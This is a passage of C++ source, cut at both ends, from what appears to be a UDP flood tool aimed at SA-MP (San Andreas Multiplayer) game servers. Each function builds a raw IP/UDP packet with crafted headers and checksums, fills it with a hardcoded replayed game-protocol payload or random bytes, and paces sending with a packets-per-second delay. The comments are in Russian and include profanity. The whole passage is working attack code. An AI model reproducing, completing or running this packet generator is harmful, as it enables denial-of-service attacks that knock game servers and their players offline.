	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz44(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 78; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x53\x41\x4d\x50\xd5\x9f\xd6\xda\x61\x1e\x69\x01\x01\x00\x64\x00\x1b\x00\x00\x00\x4f\x4e\x4c\x49\x4e\x45\x20\x52\x50\x20\x7c\x20\x54\x45\x53\x54\x20\x7c\x20\xc0\xea\xf6\xe8\xff\x20\x58\x32\x10\x00\x00\x00\x41\x6e\x64\x72\x6f\x69\x64\x20\x7c\x20\x4d\x6f\x62\x69\x6c\x65\x07\x00\x00\x00\x52\x75\x73\x73\x69\x61\x6e", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_arz45(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 113; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x53\x41\x4d\x50\xd5\x9f\xd6\xda\x61\x1e\x72\x06\x00\x07\x6c\x61\x67\x63\x6f\x6d\x70\x02\x4f\x6e\x07\x6d\x61\x70\x6e\x61\x6d\x65\x0b\x53\x61\x6e\x20\x41\x6e\x64\x72\x65\x61\x73\x07\x76\x65\x72\x73\x69\x6f\x6e\x08\x30\x2e\x33\x2e\x37\x2d\x52\x32\x07\x77\x65\x61\x74\x68\x65\x72\x01\x32\x06\x77\x65\x62\x75\x72\x6c\x12\x76\x6b\x2e\x63\x6f\x6d\x2f\x6f\x6e\x6c\x69\x6e\x65\x5f\x73\x61\x6d\x70\x09\x77\x6f\x72\x6c\x64\x74\x69\x6d\x65\x05\x31\x32\x3a\x30\x30", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_m1(struct iphdr* iph, struct udphdr* udph)
{
	char buf[] = { (char)(rand() & 0xFF), (char)(rand() & 0xFF), (char)(rand() & 0xFF) , (char)(rand() & 0xFF) , (char)(rand() & 0xFF) };
	int playloadlen = 5; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), buf, playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_m2(struct iphdr* iph, struct udphdr* udph)
{
	char buf[] = { 0x27, (char)(rand() & 0xFF), (char)(rand() & 0xFF), (char)(rand() & 0xFF), 0x1b };
	int playloadlen = 5; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), buf, playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_m3(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 2; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x1f\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_m4(struct iphdr* iph, struct udphdr* udph)
{
	char buf[] = { 0x1a, (char)(rand() & 0xFF), (char)(rand() & 0xFF) };
	int playloadlen = 3; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), buf, playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_pp1(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 514; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x03\x00\x32\x28\x06\x40\xca\x01\x00\x07\x00\x64\x90\x09\x69\x78\x4e\x2f\x40\xca\x01\x00\x08\x00\x91\x00\x00\x23\xc0\x14\x3c\xe2\x04\x0c\xa0\x10\x00\x09\x00\x91\x00\x80\x0c\x60\x20\x14\x2c\xc8\x00\x20\x20\x0e\xc3\x40\x00\x17\x06\xc6\xc8\x9d\x44\x73\x48\x85\x50\xe0\xf8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x0a\x00\x91\x01\x00\x0c\x60\x20\x14\x2c\xc8\x00\x20\x40\x08\x87\x60\x00\x13\xad\x23\xa8\xb8\x0b\xc9\xc8\x45\xf2\xb6\xd8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x0b\x00\x91\x01\x80\x0c\x60\x20\x14\x2c\xc8\x00\x20\x60\x1b\xa8\x00\x00\x01\x6d\x51\x98\x80\x5b\x00\x18\xab\xa5\x23\x88\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x0c\x00\x91\x02\x00\x0c\x60\x20\x14\x2c\xc8\x00\x20\x80\x0d\xa0\x80\x00\x1a\x1c\xc0\x68\x6f\x00\x83\xd8\x85\xe5\x39\x98\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x0d\x00\x91\x02\x80\x0c\x60\x20\x14\x2c\xc8\x00\x20\xa0\x12\x82\xe0\x00\x07\xe4\xb3\x18\x82\x26\x62\x08\xb5\xc0\x91\x68\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x0e\x00\x91\x03\x00\x0c\x60\x20\x14\x2c\xc8\x00\x20\xc0\x1d\x26\x00\x00\x14\x0a\xa6\x98\xab\xfe\x19\xd8\x8e\x78\x38\x98\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x0f\x00\x91\x03\x80\x0c\x60\x20\x14\x2c\xc8\x00\x20\xe0\x17\xa7\x60\x00\x00\x99\x14\xd8\x96\xef\x60\x58\xb5\xcc\x1c\x08\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x10\x00\x91\x04\x00\x0c\x60\x20\x14\x2c\xc8\x00\x21\x00\x0e\x47\x60\x00\x04\x88\x6b\x18\x93\xa6\x73\xf8\x95\x1a\xec\xc8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x11\x00\x91\x04\x80\x0c\x60\x20\x14\x2c\xc8\x00\x21\x20\x0a\xc6\x60\x00\x16\xa8\x43\x68\xbf\x91\xac\xe8\x92\xc0\x99\x98\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_pp2(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 501; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x03\x80\x32\x28\x06\x77\xdd\x02\x00\x08\x00\x91\x00\x00\x23\xc0\x14\x3c\xe2\x07\xad\xd0\x20\x00\x09\x00\x91\x00\x80\x0c\x60\x20\x14\x2c\xc8\x00\x20\x20\x0a\x01\x80\x00\x06\x1b\x15\x98\x92\x53\x64\xd8\xa0\xcd\xd2\xd8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x0a\x00\x91\x01\x00\x0c\x60\x20\x14\x2c\xc8\x00\x20\x40\x10\xa4\x80\x00\x1d\xbf\xa3\x38\xb1\xd4\xb4\xc8\x83\x07\x03\xe8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x0b\x00\x91\x01\x80\x0c\x60\x20\x14\x2c\xc8\x00\x20\x60\x1e\x80\x80\x00\x14\x0b\x66\x78\x82\xcb\xd7\xa8\x88\x06\xe8\x38\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x0c\x00\x91\x02\x00\x0c\x60\x20\x14\x2c\xc8\x00\x20\x80\x19\xc5\xa0\x00\x04\x93\x85\x98\xbf\x32\x84\xf8\xad\xde\x15\x18\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x0d\x00\x91\x02\x80\x0c\x60\x20\x14\x2c\xc8\x00\x20\xa0\x05\xc2\x60\x00\x02\xb8\xc3\x68\xa8\x00\x0e\x68\x75\x03\x0b\x58\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x0e\x00\x91\x03\x00\x0c\x60\x20\x14\x2c\xc8\x00\x20\xc0\x01\xc3\x80\x00\x1a\xde\xff\x48\x8d\xd8\xf9\x38\x9c\xaf\x60\x68\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x0f\x00\x91\x03\x80\x0c\x60\x20\x14\x2c\xc8\x00\x20\xe0\x16\x85\xc0\x00\x0a\x16\x8c\xe8\x7b\x86\x45\xb8\x8d\xfe\x45\x28\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x10\x00\x91\x04\x00\x0c\x60\x20\x14\x2c\xc8\x00\x21\x00\x10\xc4\xe0\x00\x12\x9e\xc9\x18\x90\x91\x26\xa8\x8f\xf5\x62\x88\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x11\x00\x91\x04\x80\x0c\x60\x20\x14\x2c\xc8\x00\x21\x20\x1c\x44\x80\x00\x09\x2b\x3b\xf8\x88\x04\xb7\x18\x78\xbc\xc2\x98\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_pp3(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 530; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x09\x00\x48\x82\x80\x06\x30\x10\x14\x2c\xc8\x00\x21\x40\x1e\xe2\x00\x00\x05\x8d\x6c\xe8\x80\x1f\x9e\x88\x22\x23\x40\xa8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x13\x00\x91\x05\x80\x0c\x60\x20\x14\x2c\xc8\x00\x21\x60\x16\x83\x00\x00\x05\x57\x51\xc8\x8a\x87\x8b\xd8\x92\x03\x23\x58\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x14\x00\x91\x06\x00\x0c\x60\x20\x14\x2c\xc8\x00\x21\x80\x0c\xa2\xc0\x00\x04\x29\xde\x78\x9c\xc1\x7a\xe8\x98\x18\x5b\x38\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x15\x00\x91\x06\x80\x0c\x60\x20\x14\x2c\xc8\x00\x21\xa0\x12\xa6\xc0\x00\x13\xc8\xcf\x58\x84\xc4\xe3\xf8\xaf\x69\xf1\x18\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x16\x00\x91\x07\x00\x0c\x60\x20\x14\x2c\xc8\x00\x21\xc0\x16\x86\xa0\x00\x03\x17\x17\x28\x72\x1b\xf0\x08\x8a\xe5\xe2\x28\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x17\x00\x91\x07\x80\x0c\x60\x20\x14\x2c\xc8\x00\x21\xe0\x19\x60\x20\x00\x1d\xd6\x4f\x78\x93\x10\x0c\xd8\x88\xb1\x50\xb8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x18\x00\x91\x08\x00\x0c\x60\x20\x14\x2c\xc8\x00\x22\x00\x05\x21\x80\x00\x13\x44\xbf\x28\x91\xb1\x24\x88\xb5\x0a\xa4\xc8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x19\x00\x91\x08\x80\x0c\x60\x20\x14\x2c\xc8\x00\x22\x20\x19\x43\x60\x00\x0e\x9e\x8b\x78\x96\x91\x4c\x98\x8e\x85\x64\x48\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x1a\x00\x91\x09\x00\x0c\x60\x20\x14\x2c\xc8\x00\x22\x40\x03\x85\xa0\x00\x06\xea\x20\x38\xb6\x5e\xb9\x48\x8f\x04\xc1\x98\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x1b\x00\x91\x09\x80\x0c\x60\x20\x14\x2c\xc8\x00\x22\x60\x1b\xc7\x80\x00\x16\x2b\x82\x08\xb4\x29\x81\x48\xba\xd5\xb7\xc8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_pp4(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 530; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x0e\x00\x48\x85\x00\x06\x30\x10\x14\x2c\xc8\x00\x22\x80\x1a\x41\x60\x00\x1d\x7d\x01\x68\xb8\x1e\x77\x18\x48\xfe\xe6\xa8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x1d\x00\x91\x0a\x80\x0c\x60\x20\x14\x2c\xc8\x00\x22\xa0\x1f\x61\x20\x00\x04\x3a\xa3\x48\xb1\x78\x24\xd8\xa1\x8c\xff\x98\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x1e\x00\x91\x0b\x00\x0c\x60\x20\x14\x2c\xc8\x00\x22\xc0\x03\xa4\x40\x00\x05\x33\x9a\x38\x87\xb7\x06\x88\xbf\x55\x93\xd8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x1f\x00\x91\x0b\x80\x0c\x60\x20\x14\x2c\xc8\x00\x22\xe0\x18\x01\xc0\x00\x09\xfc\xc0\xd8\xa5\x87\x4c\xc8\x97\xd0\x5d\x88\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x20\x00\x91\x0c\x00\x0c\x60\x20\x14\x2c\xc8\x00\x23\x00\x02\x65\x60\x00\x1a\xa4\xf9\xf8\x98\xfc\x02\xb8\xb2\x5a\xd8\xa8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x21\x00\x91\x0c\x80\x0c\x60\x20\x14\x2c\xc8\x00\x23\x20\x06\x47\x00\x00\x1b\xa7\x7b\x58\x93\x01\xba\xd8\x73\xbc\xc6\xf8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x22\x00\x91\x0d\x00\x0c\x60\x20\x14\x2c\xc8\x00\x23\x40\x14\x05\xe0\x00\x0e\xc1\x2f\x38\x98\x1a\xff\x38\x98\x10\x20\xc8\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x23\x00\x91\x0d\x80\x0c\x60\x20\x14\x2c\xc8\x00\x23\x60\x0d\xa0\x00\x00\x09\x38\x80\x68\xa6\x5e\x06\xb8\xba\x81\x48\xe8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x24\x00\x91\x0e\x00\x0c\x60\x20\x14\x2c\xc8\x00\x23\x80\x07\x26\x60\x00\x1d\x84\x90\x78\x92\xd4\x9a\xa8\x9a\x3a\x65\x88\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x25\x00\x91\x0e\x80\x0c\x60\x20\x14\x2c\xc8\x00\x23\xa0\x09\x07\xa0\x00\x0e\xd7\x52\xf8\x91\xfa\xf1\x38\x97\xcd\xc6\x98\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_pp5(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 530; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x13\x00\x48\x87\x80\x06\x30\x10\x14\x2c\xc8\x00\x23\xc0\x03\x68\xe0\x00\x00\x0e\xf1\x48\x44\xfa\x93\x58\x8b\x16\x53\x28\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x27\x00\x91\x0f\x80\x0c\x60\x20\x14\x2c\xc8\x00\x23\xe0\x18\x23\x60\x00\x16\x9a\xa0\xd8\x86\xa1\x35\x58\x9b\xb4\x62\xf8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x28\x00\x91\x10\x00\x0c\x60\x20\x14\x2c\xc8\x00\x24\x00\x1b\xa0\xe0\x00\x02\x19\x15\x68\x60\xc3\x38\xa8\x9e\xfd\xd4\x18\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x29\x00\x91\x10\x80\x0c\x60\x20\x14\x2c\xc8\x00\x24\x20\x08\x00\x00\x00\x1e\x1a\x6d\x78\x8f\x54\x31\x48\x90\x11\x0e\x98\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x2a\x00\x91\x11\x00\x0c\x60\x20\x14\x2c\xc8\x00\x24\x40\x1f\x62\x60\x00\x0d\x01\x02\x58\xb5\x1e\x70\xc8\x62\x33\xc6\xc8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x2b\x00\x91\x11\x80\x0c\x60\x20\x14\x2c\xc8\x00\x24\x60\x1f\x65\xa0\x00\x1e\x3f\xe3\xa8\xbe\x1e\x04\x38\xb4\xdf\x19\x08\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x2c\x00\x91\x12\x00\x0c\x60\x20\x14\x2c\xc8\x00\x24\x80\x0d\x44\x00\x00\x09\xa7\xd6\x58\x90\xc8\x3f\x48\x84\x96\x6c\x08\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x2d\x00\x91\x12\x80\x0c\x60\x20\x14\x2c\xc8\x00\x24\xa0\x08\x26\x40\x00\x1f\x0d\xbb\x78\x7e\xdc\x15\x58\x9f\x00\xc0\xd8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x2e\x00\x91\x13\x00\x0c\x60\x20\x14\x2c\xc8\x00\x24\xc0\x09\xc0\xc0\x00\x13\x15\xe0\x58\xab\x55\xbe\xe8\x9b\x17\x81\xb8\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x2f\x00\x91\x13\x80\x0c\x60\x20\x14\x2c\xc8\x00\x24\xe0\x1e\x67\x80\x00\x0c\x78\xde\x38\x8d\xcb\x72\xa8\x8a\x66\xb8\xf8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_pp6(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 530; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x18\x00\x48\x8a\x00\x06\x30\x10\x14\x2c\xc8\x00\x25\x00\x1d\x87\x20\x00\x16\x7d\xa0\xc8\xba\xcf\xdf\x48\x95\x01\xda\xd8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x31\x00\x91\x14\x80\x0c\x60\x20\x14\x2c\xc8\x00\x25\x20\x02\xc5\x60\x00\x00\x15\xfb\x18\x41\x0f\x61\x38\x96\xb4\xd1\x38\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x32\x00\x91\x15\x00\x0c\x60\x20\x14\x2c\xc8\x00\x25\x40\x02\x40\x20\x00\x1c\x81\xe3\x18\x85\x98\x04\x98\xbc\x54\x79\xc8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x33\x00\x91\x15\x80\x0c\x60\x20\x14\x2c\xc8\x00\x25\x60\x0f\x81\x20\x00\x1b\x18\x09\xa8\x83\x1e\x85\xd8\x95\xc7\x34\x98\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x34\x00\x91\x16\x00\x0c\x60\x20\x14\x2c\xc8\x00\x25\x80\x03\xe1\x80\x00\x0d\xf5\x46\xd8\xae\x16\x62\xf8\x7f\x8a\x0f\xe8\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x35\x00\x91\x16\x80\x0c\x60\x20\x14\x2c\xc8\x00\x25\xa0\x18\xa1\xc0\x00\x1e\xae\x46\x28\xb1\x4e\x7c\x68\x96\xdc\xf5\x18\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x08\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\x36\x00\x91\x17\x00\x0c\x60\x20\x14\x2c\xc